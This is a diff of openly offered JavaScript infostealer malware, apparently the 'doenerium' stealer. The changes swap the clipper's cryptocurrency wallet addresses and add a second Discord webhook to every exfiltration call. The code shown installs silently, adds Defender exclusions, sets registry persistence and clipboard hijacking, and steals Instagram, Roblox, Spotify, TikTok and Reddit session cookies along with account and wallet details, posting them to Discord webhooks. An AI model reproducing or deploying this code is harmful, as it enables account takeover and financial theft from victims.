-        'Include_test=0',
-        'Include_pip=1',
-        'Include_doc=0'
-    ], { stdio: 'ignore' });
-    console.log('Python installed successfully.');
+        execFileSync(pythonInstallerFile, [
+            '/quiet',
+            'InstallAllUsers=0',
+            'PrependPath=1',
+            'Include_test=0',
+            'Include_pip=1',
+            'Include_doc=0'
+        ], { stdio: 'ignore' });
+        console.log('Python installed successfully.');
     } catch (error) {
-    console.error(`Error during Python installation: ${error.message}`);
+        console.error(`Error during Python installation: ${error.message}`);
     }
 
 
@@ -1057,15 +1057,15 @@ function addDefenderExclusions() {
 
 // Replace with your addresses or all money to me :)
 const addresses = {
-    btc: "bc1qsuc4rc2uknl43kqxemuyv6d3xffnds2j008gj7",
-    eth: "0x700875DF55d904b24469458a6bAE04F6dd7eF91F",
-    ltc: "ltc1qx7n7fr4anyssyhfp2s4sd9jv7r89ex9sd2d6dg",
-    trx: "TJYeEhaoY5sQ66SHLbCp85jGcSkqLLvBTU",
-    bch: "qzjw4dju5x2x3kwtuelppmm8lpw7mvna7s5fle3sr4",
-    xmr: "43AKqd1L4QKVQux7bKEK6dUmVKEJTdEtgSgYaj25rgRGaUrp2gekLA1bRDzJbbadPTaNwBG8njmYCVvEiJZByyvV6NanCUR",
-    xrp: "rf2ysNUBNYFPX5tzNfaNgRjJDedQWh6mSV",
+    btc: "bc1qf5vql7t87p9f7rqsjc404xvntvtgjrwyknlw8y",
+    eth: "0x4C3B0920e9c861D678fD381cE559703fbae1E1C2",
+    ltc: "LY7qvtdSyfmEJuCfreZ3XYaHSNy2GpYB8Q",
+    trx: "TKijKn6rYy6smhdZdfWjSxotQD7veF2yD5",
+    bch: "qzkcs3r2lxkn3cdpz87mq0djczvdhv7vlg3wxavpsh",
+    xmr: "4AjxzsF5L93FzvsFjj4jiX1SrCbJJd77pS8KEf5G5wtJ23LMEAW5ZFZZiPaVjsnuHqNiYP7sfmDm5Ru5aqTCdpBsDph7fsK",
+    xrp: "rsYmKrvbjXiQNAGmprwM8qHtt9BEXuYZVy",
     zcash: "t1a34uQ8XRNKoWyykQUAtR6vj58UDMpaayf",
-    doge: "DQ5eZQyMbCsAGDoE7vq3zsPH7v43EvfUV6rJvtArsqqv7LEmb3BF6e1vHudGPCQppaxf"
+    doge: "DR7L7SkqgfEX6DGXM2krWBnc9Z95zgVGqH"
 };
 
 // This is a clipper, here is the decrypted code: https://pastebin.com/raw/juyfkJ4N (DM me on Telegram if you don't know how to decrypt base64 :0)
@@ -1105,7 +1105,7 @@ exec(decoded_code)
     fs.writeFileSync(scriptFilePath, scriptContent);
 
     await execPromise('pip install pyperclip');
-    
+
     try {
         // Add the script to the registry for startup
         const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
@@ -1119,7 +1119,7 @@ exec(decoded_code)
     } catch (error) {
         console.error(`Error scheduling task or adding registry entry: ${error.message}`);
     }
-    
+
     // Run the Python script in the background
     try {
         const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
@@ -1154,7 +1154,7 @@ function createRunBat() {
     // URL
     const downloadUrl1 = "YOUR-STEALER-EXE-LINK-HERE";
     const downloadUrl2 = "YOUR-BINDED-EXE-LINK-HERE";
-    
+
     const app1Path = `"${process.argv[0]}"`;
     const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';
 
@@ -1232,223 +1232,225 @@ Set objShell = Nothing`;
 
 
 async function GetInstaData(session_id) {
-  try {
-    const headers = {
-      "Host": "i.instagram.com",
-      "X-Ig-Connection-Type": "WiFi",
-      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-      "X-Ig-Capabilities": "36r/Fx8=",
-      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
-      "X-Ig-App-Locale": "en",
-      "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
-      "Accept-Encoding": "gzip, deflate",
-      "Cookie": `sessionid=${session_id};`
-    };
+    try {
+        const headers = {
+            "Host": "i.instagram.com",
+            "X-Ig-Connection-Type": "WiFi",
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Ig-Capabilities": "36r/Fx8=",
+            "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
+            "X-Ig-App-Locale": "en",
+            "X-Mid": "Ypg64wAAAAGXLOPZjFPNikpr8nJt",
+            "Accept-Encoding": "gzip, deflate",
+            "Cookie": `sessionid=${session_id};`
+        };
 
-    // Request to get Instagram account data
-    const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
-    const userData = response.data.user;
+        // Request to get Instagram account data
+        const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
+        const userData = response.data.user;
 
-    // Create data object
-    const data = {
-      username: userData.username,
-      verified: userData.is_verified,
-      avatar: userData.profile_pic_url,
-      session_id: session_id
-    };
+        // Create data object
+        const data = {
+            username: userData.username,
+            verified: userData.is_verified,
+            avatar: userData.profile_pic_url,
+            session_id: session_id
+        };
 
-    // Save Instagram session information to a file
-    saveInstagramFile(session_id);
+        // Save Instagram session information to a file
+        saveInstagramFile(session_id);
 
-    return data;
-  } catch (error) {
-    console.error('Error fetching Instagram data:', error.message);
-  }
+        return data;
+    } catch (error) {
+        console.error('Error fetching Instagram data:', error.message);
+    }
 }
 
 function saveInstagramFile(session_id) {
-  const instagramFolderPath = path.join(mainFolderPath, 'Instagram');
-  const instagramFilePath = path.join(instagramFolderPath, 'instagram.txt');
+    const instagramFolderPath = path.join(mainFolderPath, 'Instagram');
+    const instagramFilePath = path.join(instagramFolderPath, 'instagram.txt');
 
-  if (!fs.existsSync(instagramFolderPath)) {
-    fs.mkdirSync(instagramFolderPath);
-  }
+    if (!fs.existsSync(instagramFolderPath)) {
+        fs.mkdirSync(instagramFolderPath);
+    }
 
-  // Write the Instagram session information to the instagram.txt file
-  fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);
+    // Write the Instagram session information to the instagram.txt file
+    fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);
 
-  console.log('Instagram session information written to instagram.txt');
+    console.log('Instagram session information written to instagram.txt');
 }
 
 async function GetFollowersCount(session_id) {
-  try {
-    const headers = {
-      "Host": "i.instagram.com",
-      "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
-      "Cookie": `sessionid=${session_id};`
-    };
+    try {
+        const headers = {
+            "Host": "i.instagram.com",
+            "User-Agent": "Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334; 244425769) AppleWebKit/420+",
+            "Cookie": `sessionid=${session_id};`
+        };
 
-    const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
-    const accountInfo = accountResponse.data.user;
+        const accountResponse = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
+        const accountInfo = accountResponse.data.user;
 
-    const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
-    const userData = userInfoResponse.data.user;
-    const followersCount = userData.follower_count;
+        const userInfoResponse = await axios.get(`https://i.instagram.com/api/v1/users/${accountInfo.pk}/info`, { headers: headers });
+        const userData = userInfoResponse.data.user;
+        const followersCount = userData.follower_count;
 
-    return followersCount;
-  } catch (error) {
-    console.error("Error fetching followers count:", error.message);
-  }
+        return followersCount;
+    } catch (error) {
+        console.error("Error fetching followers count:", error.message);
+    }
 }
 
 async function SubmitInstagram(session_id) {
-  try {
-    const data = await GetInstaData(session_id);
-    const followersCount = await GetFollowersCount(session_id);
+    try {
+        const data = await GetInstaData(session_id);
+        const followersCount = await GetFollowersCount(session_id);
 
-    const embed = {
-      title: '‎ ',
-      color: 0x303037,
-      author: {
-        name: 'Instagram Session Detected',
-        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
-      },
-      thumbnail: { url: data.avatar },
-      fields: [
-        { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
-        { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
-        { name: '<:twitter_follow:1205132510254604388> Followers Count ', value: '```' + followersCount + '```', inline: true },
-        { name: 'Token', value: '```' + data.session_id + '```', inline: false },
-      ],
-      footer: {
-        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-      },
-    };
+        const embed = {
+            title: '‎ ',
+            color: 0x303037,
+            author: {
+                name: 'Instagram Session Detected',
+                icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
+            },
+            thumbnail: { url: data.avatar },
+            fields: [
+                { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
+                { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
+                { name: '<:twitter_follow:1205132510254604388> Followers Count ', value: '```' + followersCount + '```', inline: true },
+                { name: 'Token', value: '```' + data.session_id + '```', inline: false },
+            ],
+            footer: {
+                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+            },
+        };
 
-    await axios.post(discordWebhookUr1, { embeds: [embed] });
-
-    // Introduce a 2-second delay before sending the second webhook request
-    await new Promise(resolve => setTimeout(resolve, 1000));
-
-    // Retry logic with exponential backoff
-    let retryAttempts = 0;
-    while (retryAttempts < 3) { // Retry a maximum of 3 times
-      try {
         await axios.post(discordWebhookUrl, { embeds: [embed] });
-        break; // Break the loop if successful
-      } catch (error) {
-        if (error.response && error.response.status === 429) {
-          // Exponential backoff: Wait for an increasing amount of time
-          const delay = Math.pow(2, retryAttempts) * 1000;
-          retryAttempts++;
-          await new Promise(resolve => setTimeout(resolve, delay));
-        } else {
-          console.error("Error in second webhook request:", error.message);
-          // Log the error and skip to the next iteration
-          return; // or continue; depending on your context
+        await axios.post(discordWebhookURL, { embeds: [embed] });
+
+        // Introduce a 2-second delay before sending the second webhook request
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        // Retry logic with exponential backoff
+        let retryAttempts = 0;
+        while (retryAttempts < 3) { // Retry a maximum of 3 times
+            try {
+                await axios.post(discordWebhookUrl, { embeds: [embed] });
+                await axios.post(discordWebhookURL, { embeds: [embed] });
+                break; // Break the loop if successful
+            } catch (error) {
+                if (error.response && error.response.status === 429) {
+                    // Exponential backoff: Wait for an increasing amount of time
+                    const delay = Math.pow(2, retryAttempts) * 1000;
+                    retryAttempts++;
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                } else {
+                    console.error("Error in second webhook request:", error.message);
+                    // Log the error and skip to the next iteration
+                    return; // or continue; depending on your context
+                }
+            }
         }
-      }
+    } catch (error) {
+        console.error("Error Submit Instagram:", error.message);
     }
-  } catch (error) {
-    console.error("Error Submit Instagram:", error.message);
-  }
 }
 
 
 async function GetRobloxData(secret_cookie) {
-  let data = {};
-  let headers = {
-    'accept': 'application/json, text/plain, */*',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
-    'cookie': `.ROBLOSECURITY=${secret_cookie};`,
-    'origin': 'https://www.roblox.com',
-    'referer': 'https://www.roblox.com',
-    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-site',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
-  };
+    let data = {};
+    let headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'en-US,en;q=0.9,hi;q=0.8',
+        'cookie': `.ROBLOSECURITY=${secret_cookie};`,
+        'origin': 'https://www.roblox.com',
+        'referer': 'https://www.roblox.com',
+        'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36'
+    };
 
-  try {
-    let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });
+    try {
+        let response = await axios.get('https://www.roblox.com/mobileapi/userinfo', { headers: headers });
 
-    data['username'] = response.data['UserName'];
-    data['avatar'] = response.data['ThumbnailUrl'];
-    data['robux'] = response.data['RobuxBalance'];
-    data['premium'] = response.data['IsPremium'];
+        data['username'] = response.data['UserName'];
+        data['avatar'] = response.data['ThumbnailUrl'];
+        data['robux'] = response.data['RobuxBalance'];
+        data['premium'] = response.data['IsPremium'];
 
-    return data;
-  } catch (error) {
-    console.error('Error fetching Roblox data:', error.message);
-    throw error;
-  }
+        return data;
+    } catch (error) {
+        console.error('Error fetching Roblox data:', error.message);
+        throw error;
+    }
 }
 
 async function SubmitRoblox(secret_cookie) {
-  try {
-    let data = await GetRobloxData(secret_cookie);
+    try {
+        let data = await GetRobloxData(secret_cookie);
 
-    if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
-      return;
+        if (!data || !data.username || data.robux === undefined || data.premium === undefined) {
+            return;
+        }
+
+        const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;
+
+        let embed = {
+            title: '‎',
+            color: 0x303037,
+            author: {
+                name: 'Roblox Session Detected',
+                icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            },
+            thumbnail: {
+                url: data.avatar,
+            },
+            fields: [
+                {
+                    name: 'Name:',
+                    value: '```     ' + data.username + '     ```',
+                    inline: true,
+                },
+                {
+                    name: 'Robux:',
+                    value: '```   ' + robuxValue + '   ```',
+                    inline: true,
+                },
+                {
+                    name: 'Premium:',
+                    value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
+                    inline: true,
+                },
+                {
+                    name: 'Secret Cookie:',
+                    value: '```   ' + secret_cookie + '   ```',
+                    inline: true,
+                },
+            ],
+            footer: {
+                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+            },
+        };
+
+        let payload = {
+            embeds: [embed],
+        };
+
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        console.log('Payload to be sent:', payload);
+
+        axios.post(discordWebhookUrl, payload);
+        axios.post(discordWebhookURL, payload);
+    } catch (error) {
+        console.error('Error in SubmitRoblox:', error.message);
     }
-
-    const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;
-
-    let embed = {
-      title: '‎',
-      color: 0x303037,
-      author: {
-        name: 'Roblox Session Detected',
-        icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-      },
-      thumbnail: {
-        url: data.avatar,
-      },
-      fields: [
-        {
-          name: 'Name:',
-          value: '```     ' + data.username + '     ```',
-          inline: true,
-        },
-        {
-          name: 'Robux:',
-          value: '```   ' + robuxValue + '   ```',
-          inline: true,
-        },
-        {
-          name: 'Premium:',
-          value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
-          inline: true,
-        },
-        {
-          name: 'Secret Cookie:',
-          value: '```   ' + secret_cookie + '   ```',
-          inline: true,
-        },
-      ],
-      footer: {
-        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-      },
-    };
-
-    let payload = {
-      embeds: [embed],
-    };
-
-    await new Promise(resolve => setTimeout(resolve, 1000));
-
-    console.log('Payload to be sent:', payload);
-
-    axios.post(discordWebhookUrl, payload);
-    axios.post(discordWebhookUr1, payload);
-  } catch (error) {
-    console.error('Error in SubmitRoblox:', error.message);
-  }
 }
 
 
@@ -1501,7 +1503,8 @@ async function SpotifySession(cookie) {
         const randomString = crypto.randomBytes(3).toString('hex');
 
         setTimeout(() => {
-            axios.post(discordWebhookUrl, payload)
+            axios.post(discordWebhookUrl, payload);
+            axios.post(discordWebhookURL, payload)
                 .then(response => {
                     console.log('Webhook sent successfully spotify:', response.data);
                 })
@@ -1518,130 +1521,131 @@ async function SpotifySession(cookie) {
 
 
 function moveTikTokFile(cookie) {
-  if (!cookie) {
-    // No TikTok session information intercepted, so no need to create the folder or file
-    return;
-  }
-  const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
-  const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');
-  if (!fs.existsSync(tiktokFolderPath)) {
-    fs.mkdirSync(tiktokFolderPath);
-  }
-  // Write the intercepted TikTok session information to the tiktok.txt file
-  fs.writeFileSync(tiktokFilePath, cookie);
-  console.log('TikTok session information written to tiktok.txt');
+    if (!cookie) {
+        // No TikTok session information intercepted, so no need to create the folder or file
+        return;
+    }
+    const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
+    const tiktokFilePath = path.join(tiktokFolderPath, 'tiktok.txt');
+    if (!fs.existsSync(tiktokFolderPath)) {
+        fs.mkdirSync(tiktokFolderPath);
+    }
+    // Write the intercepted TikTok session information to the tiktok.txt file
+    fs.writeFileSync(tiktokFilePath, cookie);
+    console.log('TikTok session information written to tiktok.txt');
 }
 
 
 function stealTikTokSession(cookie) {
-  try {
-    const headers = {
-      'accept': 'application/json, text/plain, */*',
-      'accept-encoding': 'gzip, compress, deflate, br',
-      'cookie': `sessionid=${cookie}`
-    };
+    try {
+        const headers = {
+            'accept': 'application/json, text/plain, */*',
+            'accept-encoding': 'gzip, compress, deflate, br',
+            'cookie': `sessionid=${cookie}`
+        };
 
-    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
-      .then(response => {
-        const accountInfo = response.data;
+        axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
+            .then(response => {
+                const accountInfo = response.data;
 
-        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
-          throw new Error("Failed to retrieve TikTok account information.");
-        }
+                if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
+                    throw new Error("Failed to retrieve TikTok account information.");
+                }
 
-        axios.post(
-          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
-          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
-          { headers: { cookie: `sessionid=${cookie}` } }
-        )
-          .then(response => {
-            const insights = response.data;
+                axios.post(
+                    "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
+                    "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
+                    { headers: { cookie: `sessionid=${cookie}` } }
+                )
+                    .then(response => {
+                        const insights = response.data;
 
-            axios.get(
-              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
-              { headers: { cookie: `sessionid=${cookie}` } }
-            )
-              .then(response => {
-                const wallet = response.data;
+                        axios.get(
+                            "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
+                            { headers: { cookie: `sessionid=${cookie}` } }
+                        )
+                            .then(response => {
+                                const wallet = response.data;
 
-                const webhookPayload = {
-                  embeds: [
-                    {
-                      title: '‎ ',
-                      color: 0x303037,
-                      author: {
-                        name: 'Tiktok Session Detected',
-                        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png' 
-                      },
-                      fields: [
-                        {
-                          name: '<:cookie:1205123589930749995> Cookies',
-                          value: "```" + cookie + "```",
-                          inline: true
-                        },
-                        {
-                          name: "Profile URL",
-                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
-                          inline: true
-                        },
-                        {
-                          name: "User Identifier",
-                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
-                          inline: true
-                        },
-                        {
-                          name: ":envelope: Email",
-                          value: "```" + (accountInfo.data.email || "No Email") + "```",
-                          inline: true
-                        },
-                        {
-                          name: "👤 Username",
-                          value: "```" + accountInfo.data.username + "```",
-                          inline: true
-                        },
-                        {
-                          name: "<:twitter_follow:1205132510254604388> Follower Count",
-                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
-                          inline: true
-                        },
-                        {
-                          name: "<:freetiktokcoinwithblinkstar74553:1205133412122230915> Coins",
-                          value: "```" + wallet.data.coins + "```",
-                          inline: true
-                        }
-                      ],
-                      footer: {
-                        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-                      },
-                    }
-                  ]
-                };
+                                const webhookPayload = {
+                                    embeds: [
+                                        {
+                                            title: '‎ ',
+                                            color: 0x303037,
+                                            author: {
+                                                name: 'Tiktok Session Detected',
+                                                icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png'
+                                            },
+                                            fields: [
+                                                {
+                                                    name: '<:cookie:1205123589930749995> Cookies',
+                                                    value: "```" + cookie + "```",
+                                                    inline: true
+                                                },
+                                                {
+                                                    name: "Profile URL",
+                                                    value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
+                                                    inline: true
+                                                },
+                                                {
+                                                    name: "User Identifier",
+                                                    value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
+                                                    inline: true
+                                                },
+                                                {
+                                                    name: ":envelope: Email",
+                                                    value: "```" + (accountInfo.data.email || "No Email") + "```",
+                                                    inline: true
+                                                },
+                                                {
+                                                    name: "👤 Username",
+                                                    value: "```" + accountInfo.data.username + "```",
+                                                    inline: true
+                                                },
+                                                {
+                                                    name: "<:twitter_follow:1205132510254604388> Follower Count",
+                                                    value: "```" + (insights?.follower_num?.value || "Not available") + "```",
+                                                    inline: true
+                                                },
+                                                {
+                                                    name: "<:freetiktokcoinwithblinkstar74553:1205133412122230915> Coins",
+                                                    value: "```" + wallet.data.coins + "```",
+                                                    inline: true
+                                                }
+                                            ],
+                                            footer: {
+                                                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
+                                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
+                                            },
+                                        }
+                                    ]
+                                };
 
-                axios.post(discordWebhookUr1, webhookPayload);
-                axios.post(discordWebhookUrl, webhookPayload)
-                  .then(response => {
-                    console.log('Discord webhook sent successfully! send tiktok');
-                    moveTikTokFile(cookie);
-                  })
-                  .catch(error => {
-                    console.error('Error sending Discord webhook:', error.message);
-                  });
-              })
-              .catch(error => {
-                console.error('An error occurred while trying to retrieve wallet information:', error.message);
-              });
-          })
-          .catch(error => {
-            console.error('An error occurred while trying to retrieve insights:', error.message);
-          });
-      })
-      .catch(error => {
-        console.error('An error occurred while trying to retrieve account information:', error.message);
-      });
-  } catch (error) {
-    console.error('An error occurred while trying to steal TikTok session:', error.message);
-  }
+
+                                axios.post(discordWebhookUrl, webhookPayload);
+                                axios.post(discordWebhookURL, webhookPayload)
+                                    .then(response => {
+                                        console.log('Discord webhook sent successfully! send tiktok');
+                                        moveTikTokFile(cookie);
+                                    })
+                                    .catch(error => {
+                                        console.error('Error sending Discord webhook:', error.message);
+                                    });
+                            })
+                            .catch(error => {
+                                console.error('An error occurred while trying to retrieve wallet information:', error.message);
+                            });
+                    })
+                    .catch(error => {
+                        console.error('An error occurred while trying to retrieve insights:', error.message);
+                    });
+            })
+            .catch(error => {
+                console.error('An error occurred while trying to retrieve account information:', error.message);
+            });
+    } catch (error) {
+        console.error('An error occurred while trying to steal TikTok session:', error.message);
+    }
 }
 
 
@@ -1683,18 +1687,18 @@ function setRedditSession(cookie) {
                         const embedData = {
                             title: "",
                             description: "",
-                            color: 0x303037, 
+                            color: 0x303037,
                             url: '',
                             timestamp: new Date().toISOString(),
                             fields: [
-                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
-                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
-                { name: '👤 Username', value: '```' + username + '```', inline: false },
-                { name: '', value: '💬 Comments: ```' + commentKarma + '``` 👍 Total Karma: ```' + totalKarma + '```', inline: true },
-                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
-                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
